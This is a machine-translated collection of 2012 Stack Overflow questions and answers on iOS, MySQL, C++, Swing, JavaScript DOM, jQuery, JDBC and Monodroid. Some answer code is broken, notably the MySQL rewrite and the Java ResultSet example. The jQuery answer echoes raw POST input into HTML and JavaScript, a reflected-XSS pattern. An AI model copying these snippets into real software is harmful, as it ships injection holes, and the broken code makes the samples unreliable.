 $ 3.) 1110001010101010111110000010101011010111   (sound at time = 2)
 .... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:39:42.063

我不确切知道您的意思，但您不一定需要编写任何代码来获取文件的二进制转储。例如，在 linux 上你可以做

`xxd -b filename`

获得二进制转储。

# ios - 有人可以发布一些代码示例，说明如何使用 xcode 从 iphone 目标 c 进行 http 身份验证吗？

> ID：10338969
> 
> 赞同：0
> 
> 时间：2012-04-26T18:08:10.573
> 
> 标签：ios, xcode

有人可以发布一些关于如何使用 xcode 从 iphone 目标 c 进行 http 身份验证的代码示例（代码或链接）吗？

我想通过 POST 登录和密码进入我的 Web 应用程序，并能够返回响应以验证它是否经过身份验证

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:17:00.430

听起来您正在执行基于表单的身份验证，将凭据作为 POST 变量传递。如果您已经拥有正在使用的第三方网络包装器（例如[AFNetworking](https://github.com/AFNetworking/AFNetworking)），请阅读其文档以了解其用于发送 POST 变量的工具。

如果你想自己动手，基本流程是：

*   [`NSMutableURLRequest`](http://developer.apple.com/library/ios/#documentation/Cocoa/Reference/Foundation/Classes/NSMutableURLRequest_Class/Reference/Reference.html)使用登录 URL创建一个
*   使用`setHTTPMethod:`方法将请求的方法设置为“POST”
*   转义并连接您的凭据以构建[格式良好的 POST 正文](http://en.wikipedia.org/wiki/POST_%28HTTP%29)
*   将请求对象的 POST 正文设置为`setHTTPBody:`
*   使用 an 发送请求[`NSURLConnection`](http://developer.apple.com/library/ios/#documentation/cocoa/Reference/Foundation/Classes/NSURLConnection_Class/Reference/Reference.html)并使用其同步或异步 API 接收响应。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T18:13:55.157

> 有人可以发布一些关于如何使用 Xcode 从 iphone 目标 c 进行 http 身份验证的代码示例（代码或链接）吗？

请参阅Apple 在 iOS 开发者中心提供的[Advanced URL Connections示例项目。](https://developer.apple.com/library/ios/#samplecode/AdvancedURLConnections/)

> 我想通过 POST 登录和密码进入我的 Web 应用程序，并能够返回响应以验证它是否经过身份验证

这不是 HTTP 身份验证。这只是一个普通的 HTTP POST。

# mysql - 带有嵌套连接的更新语句不起作用

> ID：10338971
> 
> 赞同：1
> 
> 时间：2012-04-26T18:08:20.960
> 
> 标签：mysql, join, subquery

我需要根据另一个表中某些值的总和来更新表中的多条记录。这是我的查询：

```
UPDATE aallinnot2 c SET c.Energ_Kcal = ( SELECT d.id1, SUM( c.Energ_Kcal) 
FROM aaingred a
LEFT JOIN aaweight b ON a.unit = b.uni
LEFT JOIN aallinnot2 c ON a.mfdfsds = c.NDB_No
LEFT JOIN aalinfsds d ON a.fsdsnum = d.id1
WHERE d.own_id =42
GROUP BY id1 ) 
WHERE c.NDB_No
IN (    SELECT DISTINCT  `fsdsnum` 
FROM  `aaingred` 
WHERE  `usernum` LIKE  '42'
)

MySQL said: 

#1093 - You can't specify target table 'c' for update in FROM clause 
```

不幸的是，如果不引用目标表'c'，我不知道如何获取我的值！有解决方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T20:12:33.860

凭借疯狂的表/列名称和难以理解的逻辑，这可能是我见过的最丑陋的查询。恭喜。:)

我认为以下应该有效（或这种方法）。主要问题是解开 group-by 表达式——您需要为数据库引擎提供一个数据集，其中目标表中的每一行都连接到包含该行更新值的集合。因此，在这里，选择子查询中的新值，然后将该子查询连接到原始表。

**编辑**修正了一些语法

```
 UPDATE 
    (
    SELECT d.id1, SUM (c.Energ_Kcal) AS Sum_Energ_Kcal
        FROM aaingred a
            LEFT JOIN aaweight b ON a.unit = b.uni
            LEFT JOIN aallinnot2 c ON a.mfdfsds = c.NDB_No
            LEFT JOIN aalinfsds d ON a.fsdsnum = d.id1
        WHERE d.own_id =42
        GROUP BY id1
    ) d
    ,aaingred a, aallinnot2 d
    SET Energ_Kcal = d.Sum_Energ_Kcal
    WHERE d.id1 = a.fsdsnum
    AND a.mfdfsds = aallinnot2.NDB_No
    AND c.NDB_No IN (
        SELECT DISTINCT  `fsdsnum` 
        FROM  `aaingred` 
        WHERE  `usernum` LIKE  '42'
    ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T18:12:06.390

我不确定 mysql，但使用 SQL Server，语句将是这样的：

```
 UPDATE aallinnot2 
    SET Energ_Kcal = ( 
    SELECT SUM( c.Energ_Kcal) 
    FROM aaingred a
    LEFT JOIN aaweight b ON a.unit = b.uni
    LEFT JOIN aallinnot2 c ON a.mfdfsds = c.NDB_No
    LEFT JOIN aalinfsds d ON a.fsdsnum = d.id1
    WHERE d.own_id =42) 
    WHERE c.NDB_No
    IN (    SELECT DISTINCT  `fsdsnum` 
    FROM  `aaingred` 
    WHERE  `usernum` LIKE  '42') 
```

您不能在子句中为要更新的表起别名`UPDATE`，但可以在`FROM`子句中。

# c++ - C++ 构造函数问题

> ID：10338972
> 
> 赞同：0
> 
> 时间：2012-04-26T18:08:20.790
> 
> 标签：c++, class, constructor, crash

我有一个用于在 OpenGL 中加载和渲染对象的类。为了加载对象，我有一个名为**LoadFile(std::string FilePath)**的函数，它工作得很好，但现在我也想从构造函数加载一个文件，所以我尝试这样做：

```
CObject(std::string FilePath)
{
    CObject(); // set all values to 0
    LoadFile(FilePath);
} 
```

但是，每当我尝试渲染时，这样做会使我的应用程序崩溃，我真的不知道为什么：s。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:11:18.793

从构造函数中调用同一个类的构造函数不会像 Java 那样工作（即将一些工作委托给更通用的构造函数）。那里的语法只是意味着您正在使用默认构造函数创建一个新的临时对象。

唯一接近的是 C++11 的委托构造函数：

```
CObject(std::string FilePath): CObject()
{
    LoadFile(FilePath);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T18:11:26.497

好吧，`CObject();`不会将所有值都设置为 0，而是创建一个临时对象。它应该是：

```
CObject(std::string FilePath)
{
    //manually set fields to 0
    LoadFile(FilePath);
} 
```

如果您的默认构造函数也再次调用自身，则很可能是堆栈溢出错误。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-26T18:12:12.803

当您调用`CObject()`构造函数将所有值设置为 0 时。您实际上是在创建一个临时`CObject`对象，而不是将所有当前对象的值设置为 0。

您需要做的是创建一个私有初始化方法，默认构造函数和其他构造函数都可以在加载文件之前调用该方法，或者初始化`CObject(std::string FilePath)`构造函数中的对象成员。

# java - 从 D-ink hspa 数据卡专有调制解调器拨打语音电话

> ID：10338974
> 
> 赞同：1
> 
> 时间：2012-04-26T18:08:24.747
> 
> 标签：java, telephony

我正在使用“D-ink hspa 数据卡专有调制解调器”，并且随附的应用程序允许发送短信但不允许语音通话。我的问题是是否可以制作一个可以连接到调制解调器并通过电话拨号器进行语音呼叫的 java 应用程序。

# java - java中List的外观和感觉

> ID：10338977
> 
> 赞同：0
> 
> 时间：2012-04-26T18:08:36.033
> 
> 标签：java, swing, look-and-feel

我写了一个小程序，将在 L&F 的数量之间切换只需从列表中选择 L&F，按钮看起来会有所不同。

但在第二次机会时不会改变

我是java的初学者:)

这是我的代码

```
private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {
    // TODO add your handling code here:

int selectedIndices[] = jList1.getSelectedIndices();
try {
for (int j = 0; j < selectedIndices.length; j++){
if(j == 0){
  UIManager.setLookAndFeel("com.sun.java.swing.plaf.motif.MotifLookAndFeel");
   SwingUtilities.updateComponentTreeUI(this);
             this.pack();
}
if(j == 1){
UIManager.setLookAndFeel(UIManager.getCrossPlatformLookAndFeelClassName());
 SwingUtilities.updateComponentTreeUI(this);
              this.pack();
 }
 if(j == 2){
 UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
 SwingUtilities.updateComponentTreeUI(this);
             // this.pack();
}
if(j == 3){
UIManager.setLookAndFeel("com.sun.java.swing.plaf.nimbus.NimbusLookAndFeel");
  SwingUtilities.updateComponentTreeUI(this);
             this.pack();
}
}
}
catch (Exception e) {
               } 
     } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T18:17:38.470

如果只选择了一项（我想是这样），您的代码将始终选择 MotifLookAndFeel：

*   selectedIndices.length 为 1
*   因此 j，在您的 for 循环中，只会将 0 作为值
*   选择了 MotifLookAndFeel。

你可能想做这样的事情：

```
switch (jList1.getSelectedIndex()) {
    case 0:
       //select 1st L&F
       return;
    case 1:
       //select 2nd L&F
       return;
    case 2:
       //select 3rd L&F
       return;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T18:22:45.747

这段代码有一些问题。

1.  您循环遍历数组`for (int j = 0; j < selectedIndices.length; j++)`，但从不使用数组中的条目`selectedIndices[j]`。相反，您只需使用`j`.
2.  现在你已经硬编码了当`j==0`你将使用`MotifLookAndFeel`. 通常您会使用 selectedIndex 从列表中检索数据（=外观的标识符），并使用该标识符来更改外观
3.  只用`try{} catch( Exception e ){}`. 例如，您捕获所有`Exception`s、已检查异常和运行时异常。此外，除了例外，您不做任何事情。至少`e.printStackTrace()`在街区里打个电话，`catch`这样你就知道出了什么问题
4.  以我个人的经验，从外观和感觉从标准外观（金属）切换到系统特定外观效果很好。但是从 Metal - OS specific - Nimbus - Metal - ...切换会导致奇怪的结果。

只是为了让您继续前进，我将编写代码更像（非编译伪代码来说明我上面提到的问题）

```
//where the list is created 
//only allow single selection since I cannot set multiple L&F at the same time      
jList1.setSelectionMode( ListSelectionModel.SINGLE_SELECTION );

//button handling
int selectedIndex = jList1.getSelectedIndex();
if ( selectedIndex == -1 ) { return; } //no selection
MyLookAndFeelIdentifier identifier = jList1.getModel().getElementAt( selectedIndex );   
try{   
  UIManager.setLookAndFeel( identifier.getLookAndFeel() ); 
} catch ( UnsupportedLookAndFeelException e ){    
   e.printStackTrace(); 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T18:17:31.003

Java How To Program 一书有一个类似的程序示例。[链接1](http://cs.fit.edu/~mmahoney/cis5100/examples/ch22/fig22_17_18/LookAndFeelFrame.java) ,[链接2](http://www.cs.fit.edu/~mmahoney/cis5100/examples/ch22/fig22_17_18/LookAndFeelDemo.java)

# javascript - 我们可以防止分配给innerHTML 请求资源吗？

> ID：10338981
> 
> 赞同：4
> 
> 时间：2012-04-26T18:08:43.253
> 
> 标签：javascript, dom

以下代码会在 Firefox 和 Chrome 中生成对图像资源的 HTTP 请求。

```
var el = document.createElement('div');
el.innerHTML = "<img src='junk'/>"; 
```

作为一名程序员，我可能想要也可能不想`el`被渲染。如果我不这样做，那么也许我不希望为 src 发送请求。

`dojo.toDom()`显示相同的行为。

无论如何从字符串中获取文档片段，而无需请求引用的资源？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:12:29.017

使用[`DOMParser`](https://stackoverflow.com/questions/9250545/javascript-domparser-access-innerhtml-and-other-properties/9251106#9251106)来从给定的字符串创建完整的文档结构。

或者，使用[`beforeload`](https://stackoverflow.com/questions/4395525/safari-extension-beforeload-event-documentation)事件拦截请求。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-04-26T18:17:54.797

使用字符串创建 DOM 元素而不是创建 documentFragments 并使用它们的内存要轻得多：

```
var div = document.createElement('div');
div.innerHTML = 'some text';
document.getElementById('someparent').appendChild('div'); 
```

可以替换为：

```
var div = '<div>some text</div>';
document.getElementById('someparent').innerHTML += div; 
```

# javascript - 增加表中一个 td 的值

> ID：10338990
> 
> 赞同：0
> 
> 时间：2012-04-26T18:09:21.000
> 
> 标签：javascript, jquery, ajax, jquery-mobile

我有一个带有“添加项目”按钮的页面。单击此按钮时，将进行 ajax 调用并返回一个表，其中包含基于输入的 sku 数据库中的所有信息。（现在有用于测试的虚拟数据。）如果仅单击一次按钮，则增加或减少 qty 值没有问题。如果单击该按钮两次或多次，如果单击第二个表上的增量按钮，它将增加第一个表中的值。

我添加了一个计数器，为创建的每个表提供一个唯一编号。我想我想要做的是弄清楚如何确定正在递增的特定表的计数器编号并将其传递给 javascript 函数，以便它与该特定条目一起使用。

这是带有按钮、ajax 调用和 javascript 的代码：

```
<script type="text/javascript">
    var count = 1;
    $('#items').live('pageinit',function(event){
        $('#additem').click(function () {
            //alert("add clicked");
            var request = $.ajax({
                url: "http://www.furnguy.com/app-pages/additem.php",
                type: "POST",
                data: {COUNTER : count},
                dataType: "html"
            });

            request.done(function(html) {
                //alert("here");
                if (html != '') {
                    $('#salesitems').append(html).trigger('create');
                }
            });

            request.fail(function(jqXHR, textStatus) {
                alert( "Request failed: " + textStatus );
            });
            count++;
        });
    });

    function deleteItem() {
        $('table').click(function(){
            $(this).parent().remove();
        });
    };
    function increaseQty() {
        var currentVal = parseInt($("#qty").val());
        if (currentVal != NaN) {
            $("#qty").val(currentVal + 1);
        }
    };
    function decreaseQty() {
        var currentVal = parseInt($("#qty").val());
        if (currentVal != NaN) {
            $("#qty").val(currentVal - 1);
        }
    };

</script>
</head>
<body>
<div data-role="page" id="items" data-title="Sales Entry - Items">
    <div data-role="header">
        <h1>Sales Entry</h1>
    </div><!-- /header -->
    <div data-role="content">
        <div id="main_nav">
            <span style="float: left; display: inline; width: 100px;">
                <label>Enter SKU</label>
            </span>
            <span style="float: left; display: inline; width: 250px;">
                <input type="text" name="initialsku" id ="initialsku" />
            </span>
            <br /><br /><br />
            <button id="additem" data-icon="plus" data-inline="true" data-mini="true" data-theme="b">Add Item</button>

            <!-- <button id="removeitem" data-icon="minus" data-inline="true" data-mini="true" data-theme="b">Remove Item</button> -->
            <div id="salesitems"></div>
        </div>
    </div><!-- /content -->
</body>
</html> 
```

这是ajax调用的页面：

```
<?php
$counter = $_POST['COUNTER'];
?>
<body>

<div data-role="fieldcontain"> 
<div class="addItems"> 
    <table id="myTable" style="border-bottom: 1px solid black;"> 
        <tr> 
            <td style="width: 50px;"> 
                <label for="qty">Qty:</label> 
            </td> 
            <td style="width: 75px;"> 
                <input type="button" value="+" id="increase" onclick="increaseQty();" style="float: left; display: inline;" />
                <input type="button" value="-" id="decrease" onclick="decreaseQty();" style="float: left; display: inline;" />
                <input type="text" name="qty" id="qty" value="1" style="float: left; display: inline;" />
            </td> 
            <td style="width: 50px;"> 
                <label for="sku">SKU:</label> 
            </td> 
            <td style="width: 350px;"> 
                <input type="text" name="sku" id="sku" readonly="readonly" value="123526874256" /> 
            </td> 
            <td style="width: 50px;"> 
                <label for="retail">Retail:</label> 
            </td> 
            <td style="width: 250px;"> 
                <input type="text" name="retail" id="retail" readonly="readonly" value="$1599.99"  /> 
            </td>
            <td id="tableNumber">
                <?php echo $counter; ?>
            </td> 
        </tr> 
        <tr> 
            <td style="width: 50px;"> 
                <label for="desc">Desc:</label> 
            </td> 
            <td colspan="5"> 
                <input type="text" name="desc" id="desc" readonly="readonly" value="This is a really big couch." /> 
            </td> 
            <td> 
                <input type="button" value="X" onclick="deleteItem();" />
            </td> 
        </tr> 
    </table> 
</div> 
</div> 
```

有人对此有建议吗？我非常感谢您的帮助，因为我已经为此工作了几天。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:41:04.503

每次单击该按钮时，都会插入一个带有#qty 输入的新表。当您稍后尝试增加数量时，jQuery 只会在 dom 中找到第一个 #qty：您的第一个表。

您可能应该在您的 qty 输入上设置一个唯一的 id，例如：

```
<input type="button" value="+" id="increase" onclick="increaseQty('qty_<?php echo $_POST['INITIALSKU']; ?>');" style="float: left; display: inline;" />
<input type="button" value="-" id="decrease" onclick="decreaseQty('qty_<?php echo $_POST['INITIALSKU']; ?>');" style="float: left; display: inline;" />
<input type="text" name="qty" id="qty_<?php echo $_POST['INITIALSKU']; ?>" value="1" style="float: left; display: inline;" /> 
```

然后重写增加/减少函数以获取字段的id进行修改。我实际上不会说 PHP，但你明白了

# java - CachedRowSet、ResultSetDynaClass 还是其他集合？

> ID：10338992
> 
> 赞同：0
> 
> 时间：2012-04-26T18:09:24.957
> 
> 标签：java, collections, jdbc, resultset, cachedrowset

我正在清理一个做得很糟糕的大型网络应用程序。我不能一次全部完成，所以我把它分成几部分。我想做的一件事是用函数实现一个类，该函数接受 SQL 语句，然后返回一个集合。我的计划是，一旦解决了问题，我就可以到处寻找一个数据库框架来替换该层，而不会干扰 web 应用程序的其余部分。

从模板样式数据库访问函数中返回 ResultSet 的一个大问题是我无法在不禁用 ResultSet 的情况下关闭连接。

我很高兴在这个旧的[stackoverflow 帖子](https://stackoverflow.com/questions/4010363/how-to-prevent-a-resultset-from-being-invalidated-on-connection-close)中找到建议。

我阅读了[CachedRowSet](http://onjava.com/pub/a/onjava/2004/06/23/cachedrowset.html)上引用的文章，但我担心文章在哪里声明它的使用可能会通过将大量结果填充到自身中而产生吸收大量 JVM 内存的问题。

替代的 Apache [ResultSetDynaClass](http://commons.apache.org/beanutils/api/org/apache/commons/beanutils/ResultSetDynaClass.html)或任何其他 Collection 不会有同样的问题吗？结果必须以一种或另一种方式写入内存。正确的？

如果我使用 ChaedRowSet、ResultSetDynaClass 或 Java 集合来存储 ResultSet 数据，我会在关闭 ResultSet 后丢失这些数据吗？

我使用 HashMaps 来存储来自通用数据库查询函数的单个记录。

我怎样才能使用 java Collections 来存储多个记录而不使代码变得繁琐？假设我可以，它会比其他两个选项更节省资源或更灵活吗？

提前感谢您提供任何信息或想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:20:51.487

因为这是一个 Web 应用程序，所以您知道何时需要关闭结果集：在请求结束时。您可以在请求范围内注册您的结果集/连接，并在请求结束时将它们全部关闭。这就是 Cold Fusion（在 Java 之上运行）处理它的方式。

或者你可以像[Myna](http://www.mynajs.org)一样默认返回一个“物化”集合，或者采用一个可选的行处理程序，它将针对原始结果集执行。在第二种情况下，您可以直接访问诸如 BLOB 之类的东西，这些东西几乎总是需要特殊处理并且仅将内容放入集合中是不切实际的，并且您知道 rowHandler 何时完成，因此您可以关闭结果集/连接

更新：

这是请求结束时关闭方法的一个简单示例

```
public class Query {
    static public ConcurrentHashMap     openResultSets  = new java.util.concurrent.ConcurrentHashMap();
    public ResultSet runQuery(String sql) throws SQLException{
        //set up connection, run query
        ResultSet rs = statement.executeQuery();
        if (Query.openResults.get(Thread.currentThread().getId()) == null){
            Query.openResults.put(Thread.currentThread().getId(),new Vector())
        }
        Vector openRS =  (Vector) Query.openResults.get(Thread.currentThread().getId()) 

        openRs.add(rs);
        return rs;
    }
    public void onRequestEnd(String sql) {
        Vector openRS =  (Vector) Query.openResults.get(Thread.currentThread().getId());
        if (openRS != null){
            for (ResultSet rs : openRS.values()){
                try{
                    rs.close();
                } catch(Exception e){}
            }
        }
        //do any other request end cleanup of connections, etc
    }
}

//in your servlet
public class Query extends HttpServlet {

    public void doPost(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException{

        ResultSet rs = Query.runQuery("select * from AWESOME");
        //do awesome stuff, maybe load other classes that can run runQuery 

        Query.onRequestEnd();
    }
} 
```

这并不理想，但我不知道您使用的是什么框架。通过 setAttribute()/getAttribute() 将它保存在 HttpServletRequest 对象中可能是有意义的，但这需要将请求传递给使用它的每个方法。无论哪种方式，您只需要保留一组打开的结果集并在请求结束时关闭它们。使用某种框架使这变得容易得多。

# c# - 在 C# 中动态创建 Android 控件

> ID：10338997
> 
> 赞同：2
> 
> 时间：2012-04-26T18:09:46.140
> 
> 标签：c#, android, visual-studio-2010, xamarin.android

我正在尝试掌握 Visual Studio 中的 Monodroid。有没有办法使用 C# 为 android 布局动态创建多个控件？

我已经习惯了 ASP.NET，所以会认为类似下面的内容是有意义的 - 但是这是 XML 而不是 ASP，我有点卡住了。

```
PlaceHolder PlaceHolder1 = new PlaceHolder();

Label myLabel = new Label();
myLabel.Text = "some text";
myLabel.ID = "label ID";
PlaceHolder1.Controls.Add(myLabel); 
```

等等

任何建议的建议将不胜感激。

谢谢大家。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T19:09:36.370

占位符的等价物是布局，包括：

*   LinearLayout - 水平方向的默认方向
*   相对布局
*   网格布局
*   框架布局

有很多关于如何在 XML 中使用这些的教程 - 例如[http://www.learn-android.com/2010/01/05/android-layout-tutorial/](http://www.learn-android.com/2010/01/05/android-layout-tutorial/)

您还可以在代码中操作这些 - 使用 ViewGroup 方法 - [http://developer.android.com/reference/android/view/ViewGroup.html](http://developer.android.com/reference/android/view/ViewGroup.html) - 例如，使用 AddView

你会发现很多这样的 Java 示例，它们可以非常快速地移植到 monodroid - 例如[通过代码创建布局](https://stackoverflow.com/questions/3271215/create-layout-through-code)